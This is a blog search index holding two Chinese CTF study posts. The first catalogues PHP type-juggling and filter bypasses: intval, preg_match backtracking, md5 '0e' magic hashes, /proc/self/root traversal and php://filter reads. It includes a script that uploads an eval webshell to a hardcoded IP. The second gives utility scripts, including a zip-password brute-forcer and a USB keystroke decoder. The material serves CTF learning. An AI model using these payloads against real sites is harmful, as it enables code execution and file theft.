<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP特性</title>
      <link href="/2025/04/20/php-te-xing/"/>
      <url>/2025/04/20/php-te-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><h4 id="自动-强制-类型转换"><a href="#自动-强制-类型转换" class="headerlink" title="自动 &#x2F; 强制 类型转换"></a>自动 &#x2F; 强制 类型转换</h4><p><strong>语言特性</strong>：PHP 是一个弱类型语言, 变量之间进行比较时, 若两个变量类型不一致, 会先进行强制类型转换，然后再进行比较。</p><p>规则如下：</p><ul><li>非数字开头的字符串转换成 int 类型时会变成 0, 数字开头的字符串转换 int 类型后会保留开头的数字</li><li>一个十进制数与十六进制 &#x2F; 八进制数比较时, PHP 会将十六进制 &#x2F; 八进制数转换为十进制数</li><li>string 类型的转换会从最左边开始, 直到遇到非数字的字符时停止</li><li>含 e 的字符串转换成 int 类型时会被当做科学计数法处理, <code>123e456</code> 表示 123 的 456 次方</li><li><code>0e123</code> 表示 0 的 123 次方, 总是等于 0 <code>0e456</code> 同理</li><li>在数字开头加入 <code>\f \t \s \n \r</code> 等同样返回 true</li></ul><h4 id="强弱类型比较"><a href="#强弱类型比较" class="headerlink" title="强弱类型比较"></a>强弱类型比较</h4><p><strong>&#x3D;&#x3D;</strong> 弱类型比较, 仅要求两边变量类型转换后的值相等</p><p><strong>&#x3D;&#x3D;&#x3D;</strong> 强类型比较, 不仅要求两个变量的值相等, 还要求变量的类型相同</p><p>同理 <strong>!&#x3D;</strong> 是弱类型比较, 而 <strong>!&#x3D;&#x3D;</strong> 是强类型比较</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">&#x27;123&#x27; == 123 // true &#x27;123&#x27; === 123 // false</code></pre><p><img src="image-20250414215823672.png" alt="image-20250414215823672"></p><p><img src="image-20250414215903794.png" alt="image-20250414215903794"></p><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p>基于获取变量的整数值函数的绕过</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">intval(mixed $value, int $base = 10): int# eg:intval(&#x27;0337522&#x27;, 0); # 八进制intval(&#x27;0x1bf52&#x27;, 0); # 十六进制# -> 114514</code></pre><p>当 <code>$base = 0</code> 时, 通过检测 var（$value） 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制 (octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><p>另：intval 可以取整 (去除小数点后的部分) 和截断 (去除数字后的字符串, 包括科学计数法)</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">intval(&#x27;114514.0&#x27;);intval(&#x27;114514.1&#x27;);intval(&#x27;114514a&#x27;);intval(&#x27;114514e123&#x27;);# -> 114514</code></pre><p>eg:</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==="4476")&#123;        die("no no no!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;</code></pre><p>解法</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">八进制表示法：?num=010574010574 是八进制，转换为十进制是 4476字符串 "010574" 不等于 "4476"十六进制表示法：?num=0x117c0x117c 是十六进制，转换为十进制是 4476字符串 "0x117c" 不等于 "4476"科学计数法：?num=4476e04476e0 转换为整数是 4476字符串 "4476e0" 不等于 "4476"前导空格/特殊字符：?num=4476%20字符串 "4476 " 不等于 "4476"intval() 会忽略后面的空格</code></pre><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>正则函数缺陷 </p><h4 id="单行-多行匹配"><a href="#单行-多行匹配" class="headerlink" title="单行 &#x2F; 多行匹配"></a>单行 &#x2F; 多行匹配</h4><p>(URL编码的 <code>%0A</code> 是换行符 <code>\n</code>)</p><p>在正则表达式中，<code>$</code> 是一个特殊字符（锚字符），用于匹配字符串的结尾位置。</p><p>在多行模式下，<code>$</code> 不仅匹配整个字符串的结尾，还匹配每行的结尾（即 <code>\n</code> 或 <code>\r</code> 之前的位置）。</p><p>如果要匹配实际的 <code>$</code> 字符（而不是作为特殊字符），需要使用转义：$</p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># ctfshow-web89 正则缺陷# 利用数组绕过正则匹配，使其返回值发生错误而为false : ?num[]=1if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match("/[0-9]/", $num))&#123;        die("no no no!");    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;</code></pre><h4 id="正则回溯（没懂）"><a href="#正则回溯（没懂）" class="headerlink" title="正则回溯（没懂）"></a>正则回溯（没懂）</h4><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限</p><p>如何绕过呢，让回溯次数超过最大限制就可以使preg_match()函数返回false，从而绕过限制，中文的回溯次数在100万次就好崩溃，这个回溯保护使PHP为了防止关于正则表达式的DDOS<br>payload:<br>GET:</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import requestsfrom io import BytesIOpayload =BytesIO(b&#x27;[]&#x27;+b&#x27;a&#x27;*1000000)res = requests.get(&#x27;[]?[]=&#x27;+str(payload))print(res.text)</code></pre><p>POST:</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">import requestsfrom io import BytesIOfiles = &#123;  &#x27;file&#x27;: BytesIO(b&#x27;aaa<?php eval($_POST[txt]);//&#x27; + b&#x27;a&#x27; * 1000000)&#125;res = requests.post(&#x27;http://51.158.75.42:8088/index.php&#x27;, files=files, allow_redirects=False)print(res.headers)</code></pre><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a><strong>strpos()</strong></h2><p><strong>strpos — 查找字符串首次出现的位置</strong></p><p><strong><code>strpos(&#39;01234&#39;, 0)</code> 返回的结果是 0 对应的索引 0, 也就是 false</strong></p><p><strong>如果是 <code>!strpos()</code> 这种则会返回 true</strong></p><p><strong>代码使用了 <code>if(!strpos($str, 0))</code> 对八进制进行过滤, 可以在字符串开头加空格绕过</strong></p><p><strong>strpos() 遇到数组返回 null</strong></p><p><strong>strrpos() stripos() strripos() 同理</strong></p><p><strong><img src="image-20250415204317350.png" alt="image-20250415204317350"></strong></p><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a><strong>is_numeric()</strong></h2><p><strong>数字或数字字符串检查函数</strong></p><p><strong>特性：</strong></p><ul><li><strong>可识别科学计数法，如：<code>0123e4567</code> 返回 true</strong></li><li><strong>包含非 e 字母返回 false</strong></li><li><strong>在数字  开头  加入空格 换行符 tab 等特殊字符可以绕过检测</strong></li><li><strong>可以尝试利用 base64 + bin2hex 找到一些只含 e 和数字的 payload</strong></li></ul><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">is_numeric(&#x27; 36&#x27;); // trueis_numeric(&#x27;36 &#x27;); // falseis_numeric(&#x27;3 6&#x27;); // falseis_numeric("\n36"); // trueis_numeric("\t36"); // trueis_numeric("36\n"); // falseis_numeric("36\t"); // false</code></pre><p><strong><img src="image-20250415210640094.png" alt="image-20250415210640094"></strong></p><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a><strong>in_array()</strong></h2><p><strong>is_array() 可以「检测」变量是不是「数组」类型。</strong></p><p><strong>由于 PHP 自动 &#x2F; 强制 类型转换的特性，会将待搜索的值的类型自动转换为数组中的值的类型。</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">var_dump(in_array(&#x27;1abc&#x27;, [1,2,3,4,5])); // truevar_dump(in_array(&#x27;abc&#x27;, [1,2,3,4,5])); // falsevar_dump(in_array(&#x27;abc&#x27;, [0,1,2,3,4,5])); // true</code></pre><p><strong>注意： is_array() 函数只能判断「普通数组」，不能判断关联数组或多维数组。</strong></p><p><strong>is_array() 只关心变量的「类型」，而不关心里面的「值」；即使里面没有值，也会返回true。</strong></p><p><strong>is_array() 一次只能判断「一个」变量，如果传入多个变量，会报Warning，并且执行结果也不正确。</strong></p><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a><strong>ereg()</strong></h2><p><strong>ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</strong></p><p><strong>.ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</strong></p><p><strong>这里ereg有两个漏洞：</strong> </p><p>  <strong>①%00截断及遇到%00则默认为字符串的结束</strong></p><p>  <strong>②当ntf为数组时它的返回值不是FALSE</strong></p><h2 id="trim-¶"><a href="#trim-¶" class="headerlink" title="trim()¶"></a><strong>trim()<a href="https://hello-ctf.com/hc-tags/web/PHP_features/#trim">¶</a></strong></h2><p><strong>不过滤 \f 换页符, url 编码后是 <code>%0c36</code></strong></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a><strong>变量覆盖</strong></h2><p><strong>几种形式</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$$key = $$value;extract()parse_str()import_request_variables()</code></pre><p><strong>思路是 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIKE</code> 相互转换</strong></p><p><strong>或者利用 <code>$GLOBALS</code> 输出所有的全局变量</strong></p><p><strong>另外</strong></p><p><strong>parse_str() 函数把查询字符串解析到变量中。</strong></p><p><strong>注释：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</strong></p><p> <strong>即parse_str() 接受数组传参 支持数组内变量覆盖</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?_POST[key1]=36d&_POST[key2]=36d</code></pre><p> <strong>import_request_variables()</strong></p><p><strong>将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 <a href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals">register_globals</a>，但又想用到一些全局变量，那么此函数就很有用。</strong></p><h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a><strong>路径穿越</strong></h2><p><strong>通过绝对路径 &#x2F; 相对路径绕过正则对文件名的检测, 例如 <code>preg_match(&#39;/flag.php/&#39;, $str)</code></strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./flag.php./ctfshow/../flag.php/var/www/html/flag.php</code></pre><p><strong>利用 Linux 下的软链接绕过</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre><p><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></p><p><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php//result PD9waHAKCiRmbGFnPSJ0ZXN0e30iOwo=</code></pre><h2 id="哈希字符串"><a href="#哈希字符串" class="headerlink" title="哈希字符串"></a><strong>哈希字符串</strong></h2><h3 id="0e-bypass"><a href="#0e-bypass" class="headerlink" title="0e bypass"></a><strong>0e bypass</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$_GET[&#x27;name&#x27;] != $_GET[&#x27;password&#x27;]MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;])</code></pre><p><strong>PHP 在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么 PHP 将会认为他们相同，都是 0。</strong></p><p><strong>这一点在 md5() &#x2F; sha1() 都适用，以下是可用的 payload：</strong></p><h4 id="md5-0e-payload"><a href="#md5-0e-payload" class="headerlink" title="md5 0e payload"></a><strong>md5 0e payload</strong></h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">QNKCDZO240610708 s878926199a s155964671a s214587387a</code></pre><h4 id="sha1-0e-payload"><a href="#sha1-0e-payload" class="headerlink" title="sha1 0e payload"></a><strong>sha1 0e payload</strong></h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">```sha1 0e payload# sha1 0e payloadaaroZmOkaaK1STfYaaO8zKZFaa3OFF9m0e129063370410932435112</code></pre><h3 id="Array-bypass"><a href="#Array-bypass" class="headerlink" title="Array bypass"></a><strong>Array bypass</strong></h3><p><strong>md5 加密数组时返回 null</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a = Array();$b = Array();md5($a) == md5($b); // null == null truemd5($a) === md5($b); // null === null true</code></pre><p><strong>sha1 同理</strong></p><h4 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a><strong>哈希碰撞</strong></h4><p><strong>eg:</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># ctfshow - web97if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;    if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])        if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))            echo $flag;    else        print &#x27;Wrong.&#x27;;&#125;# a[]=1&b[]=2 -> 弱类型比较可以直接数组绕过，其结果都会转换为null</code></pre><p><strong>如果进行了 string 强制转类型后，则不再接受数组，以下为弱碰撞：</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a=(string)$a;$b=(string)$b;if(  ($a!==$b) && (md5($a)==md5($b)) )&#123;    echo $flag;&#125;# a=QNKCDZO&b=240610708</code></pre><p><strong>强碰撞则不为特性，这时需要找到两个真正的 md5 值相同数据：</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">$a=(string)$a;$b=(string)$b;if(  ($a!==$b) && (md5($a)===md5($b)) )&#123;    echo $flag;&#125;# 使用使用 fastcoll / hashclash 工具进行md5碰撞生成相同md5但不通变量值的内容</code></pre><h2 id="扩"><a href="#扩" class="headerlink" title="扩"></a><strong>扩</strong></h2><h3 id="函数与数字运算"><a href="#函数与数字运算" class="headerlink" title="函数与数字运算"></a><strong>函数与数字运算</strong></h3><p><strong>在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">1+phpinfo()+1;</code></pre><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">+ - * / & |` 都行, 另外还有 `&& ||</code></pre><h3 id="三目运算符构造语句"><a href="#三目运算符构造语句" class="headerlink" title="三目运算符构造语句"></a><strong>三目运算符构造语句</strong></h3><p><strong>有时候构造不带分号 payload 时需要用到三目运算符</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">return 1 ? phpinfo():1;(<条件> ? 参数_1 : 参数_2)</code></pre><p><strong>1 永远为 true, 于是正常执行 phpinfo</strong></p><h3 id="根命名空间-绕过过滤"><a href="#根命名空间-绕过过滤" class="headerlink" title="根命名空间 绕过过滤"></a><strong>根命名空间 绕过过滤</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">PHP 的命名空间默认为 \, 所有的函数和类都在 \ 这个命名空间中, 如果直接写函数名 function_name() 调用, 调用的时候其实相当于写了一个相对路径; 而如果写 \function_name() 这样调用函数. 则其实是写了一个绝对路径. 如果你在其他 namespace 里调用系统类, 就必须写绝对路径这种写法.</code></pre><p><strong>有时候可以绕过一些正则, 比如执行的代码不允许以字母开头</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">\phpinfo();</code></pre><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext()"></a><strong>gettext()</strong></h3><p><strong>不含字母数字的函数:<code>_()</code> 为 gettext() 别名, 类似于 echo 输出。</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">var_dump(call_user_func(call_user_func("_", "get_defined_vars")));</code></pre><p><strong>以上命令可以返回所有已定义变量</strong></p><h3 id="GLOBALS-和-get-defined-vars"><a href="#GLOBALS-和-get-defined-vars" class="headerlink" title="$GLOBALS 和 get_defined_vars()"></a><strong>$GLOBALS 和 get_defined_vars()</strong></h3><p><strong><code>$GLOBALS</code> 引用全局作用域中可用的全部变量</strong></p><p><strong>get_defined_vars() 返回由所有已定义变量所组成的数组</strong></p><p><strong>有时候可以从这里面查看 <code>$flag</code></strong></p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a><strong>伪协议</strong></h3><p><strong>常见的 php:&#x2F;&#x2F;filter php:&#x2F;&#x2F;input data:&#x2F;&#x2F; 都很熟悉了</strong></p><p><strong>下面是一些不是很常见的 payload</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">compress.zlib://flag.phpphp://filter/ctfshow/resource=flag.php</code></pre><p><strong>php:&#x2F;&#x2F;filter 遇到不存在的过滤器会直接跳过, 可以绕过一些对关键字的检测</strong></p><h3 id="无参数函数读文件-RCE"><a href="#无参数函数读文件-RCE" class="headerlink" title="无参数函数读文件 &#x2F;RCE"></a><strong>无参数函数读文件 &#x2F;RCE</strong></h3><p><strong>无参数函数指形如 <code>a(b(c()))</code> 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数</strong></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a><strong>create_function()</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">create_function(string $args, string $code): string</code></pre><p><strong>create_function(string $args, string $code): string</strong></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a><strong>call_user_func()</strong></h3><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">call_user_func(callable $callback, mixed ...$args): mixed</code></pre><h3 id="原生类列目录-RCE"><a href="#原生类列目录-RCE" class="headerlink" title="原生类列目录 &#x2F;RCE"></a><strong>原生类列目录 &#x2F;RCE</strong></h3><p><strong>一般都是 <code>echo new $v1($v2(&#39;xxx&#39;))</code> 或者 <code>eval($v(&#39;ctfshow&#39;))</code> 的形式, 有时候可以跳出来执行其它代码</strong></p><p><strong>ReflectionClass 和 Exception 里面可以执行其它函数</strong></p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">new Exception(system(&#x27;xx&#x27;))new ReflectionClass(system(&#x27;xx&#x27;))new FilesystemIterator(getcwd())new ReflectionClass(&#x27;stdClass&#x27;);system()//</code></pre><p><strong>##</strong> </p><h3 id="属性类型不敏感"><a href="#属性类型不敏感" class="headerlink" title="属性类型不敏感"></a><strong>属性类型不敏感</strong></h3><p><strong>在 PHP 7.1 + 的版本中, 对属性类型 (public protected private) 不敏感。</strong></p><p><strong>因为 protected 和 private 反序列化后的结果中含有 <code>%00</code>, 部分题目会禁止这种字符, 可在构造 payload 时将属性全部改成 public 来绕过限制。</strong></p><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a><strong>session.upload_progress</strong></h3><p><strong>该机制中的缓存可被文件包含和反序列化恶意利用。</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见脚本</title>
      <link href="/2025/03/28/chang-jian-jiao-ben/"/>
      <url>/2025/03/28/chang-jian-jiao-ben/</url>
      
        <content type="html"><![CDATA[<h4 id="1-合并zip文件"><a href="#1-合并zip文件" class="headerlink" title="1.合并zip文件"></a>1.合并zip文件</h4><pre class=" language-highlight plaintext"><code class="language-highlight plaintext"># 设置文件前缀、输出文件名和部分文件数量file_prefix = "flag.zip"  # 文件前缀output_file = "flag.zip"   # 输出文件名 # 打开输出文件以二进制写入with open(output_file, &#x27;wb&#x27;) as outfile:    # 遍历每个部分文件    for i in range(1, 10):        part_file = f"&#123;file_prefix&#125;.&#123;i:03d&#125;"        # 打开每个部分文件以二进制读取        with open(part_file, &#x27;rb&#x27;) as infile:            # 读取文件内容并写入输出文件            outfile.write(infile.read()) print(f"合并完成，输出文件：&#123;output_file&#125;")</code></pre><h4 id="2-逆行序"><a href="#2-逆行序" class="headerlink" title="2.逆行序"></a>2.逆行序</h4><p>（注意需要将文件里无关的所有东西清理包括空格，否则影响代码的执行）</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">with open(&#x27;passwd.txt&#x27;, &#x27;r&#x27;) as file:    lines = file.readlines()# 将逆序内容写入 pass.txtwith open(&#x27;pass.txt&#x27;, &#x27;w&#x27;) as f:    for line in reversed(lines):        f.write(line.strip() + &#x27;\n&#x27;)  # 确保每行有换行符</code></pre><h4 id="3-嵌套压缩包解密"><a href="#3-嵌套压缩包解密" class="headerlink" title="3.嵌套压缩包解密"></a>3.嵌套压缩包解密</h4><pre class=" language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> zipfile<span class="keyword">import</span> os<span class="keyword">import</span> subprocesspasswords_file = <span class="string">&#x27;pass.txt&#x27;</span><span class="keyword">with</span> <span class="built_in">open</span>(passwords_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:    passwords = f.read().splitlines()output_dir = <span class="string">r&#x27;D:\\nonono\misc&#x27;</span><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):    os.makedirs(output_dir)current_zip_file = <span class="string">&#x27;100.zip&#x27;</span>current_level = <span class="number">100</span><span class="keyword">for</span> password <span class="keyword">in</span> passwords:    <span class="built_in">print</span>(<span class="string">f"正在尝试使⽤密码: <span class="subst">&#123;password&#125;</span>"</span>)    cmd = <span class="string">r&#x27;"F:\应用\WinRAR.exe" x -p%s "%s" "%s"&#x27;</span> % (password,current_zip_file, output_dir)    result = subprocess.run(cmd, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)    <span class="keyword">if</span> result.returncode == <span class="number">0</span>:        <span class="built_in">print</span>(<span class="string">f"成功使⽤密码: <span class="subst">&#123;password&#125;</span>解密了<span class="subst">&#123;current_zip_file&#125;</span>"</span>)        next_zip_file = os.path.join(output_dir, <span class="string">f"<span class="subst">&#123;current_level - <span class="number">1</span>&#125;</span>.zip"</span>)        <span class="keyword">if</span> os.path.exists(next_zip_file):             current_zip_file = next_zip_file             current_level -= <span class="number">1</span>        <span class="keyword">else</span>:            <span class="built_in">print</span>(<span class="string">f"没有找到下⼀个ZIP⽂件(<span class="subst">&#123;current_level - <span class="number">1</span>&#125;</span>.zip)，解密结束。"</span>)            <span class="keyword">break</span>    <span class="keyword">else</span>:        <span class="built_in">print</span>(<span class="string">f"使⽤密码: <span class="subst">&#123;password&#125;</span>解密<span class="subst">&#123;current_zip_file&#125;</span>失败，跳过该密码。"</span>)        <span class="keyword">continue</span><span class="built_in">print</span>(<span class="string">f"当前解压级别: <span class="subst">&#123;current_level&#125;</span>,当前密码: <span class="subst">&#123;password&#125;</span>"</span>)<span class="built_in">print</span>(<span class="string">"所有嵌套的ZIP⽂件解密完成！"</span>)</code></pre><h4 id="4-键盘流量"><a href="#4-键盘流量" class="headerlink" title="4.键盘流量"></a>4.键盘流量</h4><p>用脚本来加上冒号</p><pre class=" language-highlight python">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string"><code class="language-highlight python">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)<span class="keyword">while</span> <span class="number">1</span>:    a=f.readline().strip()    <span class="keyword">if</span> a:        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span>            out=<span class="string">&#x27;&#x27;</span>            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">":"</span>                <span class="keyword">else</span>:                    out+=a[i]+a[i+<span class="number">1</span>]            fi.write(out)            fi.write(<span class="string">&#x27;\n&#x27;</span>)    <span class="keyword">else</span>:        <span class="keyword">break</span>fi.close()</code></pre><p>用脚本还原对应数据的信息</p><p>keyboard1.py</p><pre class=" language-highlight python">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string"><code class="language-highlight python">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span 